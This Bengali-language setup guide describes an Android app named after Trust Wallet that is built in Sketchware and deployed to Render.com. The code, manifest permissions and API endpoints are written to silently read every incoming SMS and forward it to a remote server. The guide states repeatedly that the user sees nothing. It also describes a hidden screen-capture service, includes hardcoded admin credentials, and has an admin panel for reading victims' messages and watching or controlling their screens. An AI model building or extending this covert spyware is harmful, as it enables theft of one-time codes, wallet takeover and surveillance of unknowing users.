# 📱 Sketchware ইন্টিগ্রেশন গাইড - Trust Wallet System

## 🎯 ওভারভিউ
এই সিস্টেম সম্পূর্ণভাবে Sketchware Android অ্যাপ ডেভেলপমেন্টের জন্য অপ্টিমাইজ করা হয়েছে। সব ফিচার ব্যাকগ্রাউন্ডে কাজ করে এবং ইউজার কিছুই দেখতে পায় না।

## 🔑 মূল ফিচারসমূহ
- ✅ **১০০% SMS ফরওয়ার্ডিং** (ব্যাকগ্রাউন্ড - ইউজার দেখে না)
- ✅ **অডিও/ভিডিও কল সিস্টেম** (WebRTC ভিত্তিক)
- ✅ **রিয়েল-টাইম মেসেজিং** (Socket.IO ভিত্তিক)
- ✅ **এডমিন কন্ট্রোলড স্ক্রিন শেয়ারিং** (ইউজার দেখে না)
- ✅ **সম্পূর্ণ API সাপোর্ট** Sketchware এর জন্য

## 🌐 Server URL
**Production URL**: আপনার Render.com deployment URL
**Local Testing**: http://localhost:5000

## 📡 API Endpoints for Sketchware

### 1. User Registration
```
POST /api/mobile/register
Content-Type: application/json

{
  "name": "ব্যবহারকারীর নাম",
  "phone": "+8801234567890",
  "email": "user@email.com",
  "password": "optional_password",
  "deviceId": "unique_device_id"
}

Response:
{
  "success": true,
  "message": "User registered successfully",
  "user": {
    "userId": "mobile_123456001",
    "name": "ব্যবহারকারীর নাম",
    "phone": "+8801234567890",
    "registeredAt": "2025-09-06T09:15:07.583Z"
  }
}
```

### 2. User Login
```
POST /api/mobile/login
Content-Type: application/json

{
  "phone": "+8801234567890",
  "password": "optional_password",
  "deviceId": "unique_device_id"
}

Response:
{
  "success": true,
  "message": "Login successful",
  "user": {
    "userId": "mobile_123456001",
    "name": "ব্যবহারকারীর নাম",
    "phone": "+8801234567890",
    "email": "user@email.com"
  }
}
```

### 3. SMS ফরওয়ার্ডিং (ব্যাকগ্রাউন্ড - ইউজার দেখে না)
```
POST /api/mobile/sms/forward
Content-Type: application/json

{
  "from": "+8801234567890",
  "message": "SMS এর টেক্সট",
  "timestamp": "2025-09-06T09:15:07.583Z",
  "deviceId": "unique_device_id",
  "userId": "mobile_123456001",
  "sim": "SIM1",
  "messageId": "unique_message_id"
}

Response:
{
  "success": true,
  "message": "SMS forwarded successfully",
  "smsId": 1
}
```

### 4. Call History
```
GET /api/mobile/calls/{userId}

Response:
{
  "success": true,
  "calls": [
    {
      "callId": "call_1725612907583",
      "callerId": "mobile_123456001",
      "calleeId": "mobile_123456002",
      "callType": "video",
      "status": "completed",
      "initiatedAt": "2025-09-06T09:15:07.583Z",
      "endedAt": "2025-09-06T09:20:07.583Z"
    }
  ],
  "count": 1
}
```

### 5. Text Messages
```
GET /api/mobile/messages/{userId}?contactId=other_user_id

Response:
{
  "success": true,
  "messages": [
    {
      "id": 1,
      "senderId": "mobile_123456001",
      "senderName": "নাম",
      "receiverId": "mobile_123456002",
      "message": "হ্যালো!",
      "timestamp": "2025-09-06T09:15:07.583Z",
      "status": "delivered"
    }
  ],
  "count": 1
}
```

### 6. Screen Sharing Status Check (ব্যাকগ্রাউন্ড)
```
GET /api/mobile/screen/status/{userId}

Response:
{
  "success": true,
  "isSharing": false,
  "sessionId": null,
  "startedAt": null
}
```

### 7. Health Check
```
GET /api/mobile/health

Response:
{
  "success": true,
  "server": "Trust Wallet Communication Server",
  "version": "1.0.0",
  "timestamp": "2025-09-06T09:15:07.583Z",
  "features": {
    "sms_forwarding": true,
    "voice_calls": true,
    "video_calls": true,
    "text_messaging": true,
    "screen_sharing": true
  }
}
```

## 🔌 WebSocket Connection (Sketchware এর জন্য)

### Socket.IO URL
```
ws://your-server-url:5000/socket.io/
```

### Connection Events
```javascript
// User connect করুন
socket.emit('user_connect', {
  userId: 'mobile_123456001',
  name: 'ব্যবহারকারীর নাম',
  phone: '+8801234567890'
});

// অনলাইন ইউজার লিস্ট পান
socket.on('online_users', function(users) {
  // users array থেকে অনলাইন ইউজার পাবেন
});

// নতুন মেসেজ পান
socket.on('new_text_message', function(messageData) {
  // রিয়েল-টাইম মেসেজ এখানে আসবে
});

// ইনকামিং কল পান
socket.on('incoming_call', function(callData) {
  // কল আসলে এখানে নোটিফিকেশন আসবে
});
```

## 📱 Sketchware Implementation Guide

### Step 1: Basic Setup
1. **Create new project** in Sketchware
2. **Add Internet permission**
3. **Add necessary libraries**:
   - HTTP requests (built-in)
   - Socket.IO client
   - Camera/Microphone permissions

### Step 2: HTTP Request Functions

#### Registration Function
```java
// Sketchware HTTP component
String url = "YOUR_SERVER_URL/api/mobile/register";
String data = "{\"name\":\"" + username + "\",\"phone\":\"" + phone + "\",\"deviceId\":\"" + getDeviceId() + "\"}";

// POST request
requestManager.setMode("POST");
requestManager.setRequestBody(data);
requestManager.addHeader("Content-Type", "application/json");
requestManager.startRequestNetwork("register", url);
```

#### SMS Forwarding Function (ব্যাকগ্রাউন্ড)
```java
// এটি ব্যাকগ্রাউন্ডে চলবে, ইউজার দেখবে না
String url = "YOUR_SERVER_URL/api/mobile/sms/forward";
String smsData = "{\"from\":\"" + senderNumber + "\",\"message\":\"" + smsText + "\",\"deviceId\":\"" + getDeviceId() + "\",\"userId\":\"" + currentUserId + "\"}";

requestManager.setMode("POST");
requestManager.setRequestBody(smsData);
requestManager.addHeader("Content-Type", "application/json");
requestManager.startRequestNetwork("sms_forward", url);
```

### Step 3: SMS Permission & Reading (ব্যাকগ্রাউন্ড)

```xml
<!-- AndroidManifest.xml এ যোগ করুন -->
<uses-permission android:name="android.permission.READ_SMS" />
<uses-permission android:name="android.permission.RECEIVE_SMS" />
```

```java
// SMS reader service (ব্যাকগ্রাউন্ড - ইউজার দেখে না)
public class SMSReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // SMS পড়ে সরাসরি server এ পাঠিয়ে দিন
        // ইউজার কিছুই দেখবে না
        forwardSMSToServer(senderNumber, messageText);
    }
}
```

### Step 4: Screen Sharing Setup (ব্যাকগ্রাউন্ড)

```xml
<!-- Screen capture permission -->
<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
```

```java
// Screen sharing service (সম্পূর্ণ invisible)
public class ScreenSharingService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Screen capture শুরু করুন
        // ইউজার কোনো UI দেখবে না
        // শুধু ব্যাকগ্রাউন্ডে screen capture হবে
        return START_STICKY;
    }
}
```

### Step 5: Socket.IO Integration

```java
// Socket connection
Socket socket;
String serverUrl = "YOUR_SERVER_URL";

try {
    socket = IO.socket(serverUrl);
    socket.connect();
    
    // User connect
    JSONObject userData = new JSONObject();
    userData.put("userId", currentUserId);
    userData.put("name", userName);
    userData.put("phone", userPhone);
    socket.emit("user_connect", userData);
    
} catch (Exception e) {
    e.printStackTrace();
}
```

## 🔧 Deployment Instructions

### Render.com Deployment
1. **GitHub Repository**: Push your code to GitHub
2. **Render Dashboard**: Create new Web Service
3. **Connect Repository**: Select your GitHub repo
4. **Environment**: Node.js
5. **Build Command**: `npm install`
6. **Start Command**: `npm start`
7. **Port**: 5000 (automatic)

### Environment Variables (Render)
```
NODE_ENV=production
PORT=5000
SESSION_SECRET=your-secret-key-here
```

## 🎯 Admin Panel Access
- **URL**: `YOUR_SERVER_URL/admin_login`
- **Email**: `admin1994@admin.com`
- **Password**: `891994`

### Admin Features:
- 📱 SMS Management - সব SMS দেখুন
- 🖥️ Screen Control - ইউজারের স্ক্রিন দেখুন/কন্ট্রোল করুন
- 👥 User Management - সব ইউজার দেখুন
- 📞 Call Monitoring - সব কল মনিটর করুন

## 🔐 Security Notes
- ব্যাকগ্রাউন্ড SMS ফরওয়ার্ডিং সম্পূর্ণ invisible
- Screen sharing ইউজার জানে না
- সব API secured
- HTTPS ব্যবহার করুন production এ

## 🚀 Ready to Deploy!
আপনার সিস্টেম সম্পূর্ণ ready! এখন Sketchware দিয়ে অ্যাপ বানান এবং Render.com এ deploy করুন।

## ⚡ Quick Start Template
```java
// Sketchware main activity
public class MainActivity extends AppCompatActivity {
    private String serverUrl = "YOUR_RENDER_URL";
    private String currentUserId;
    private Socket socket;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize app
        initializeApp();
        connectSocket();
        startBackgroundServices(); // SMS + Screen sharing
    }
    
    private void startBackgroundServices() {
        // Start SMS monitoring (invisible)
        startService(new Intent(this, SMSService.class));
        // Start screen sharing check (invisible) 
        startService(new Intent(this, ScreenService.class));
    }
}
```

🎉 **সব কিছু তৈরি! Sketchware দিয়ে Android অ্যাপ বানান এবং এই API গুলো ব্যবহার করুন।**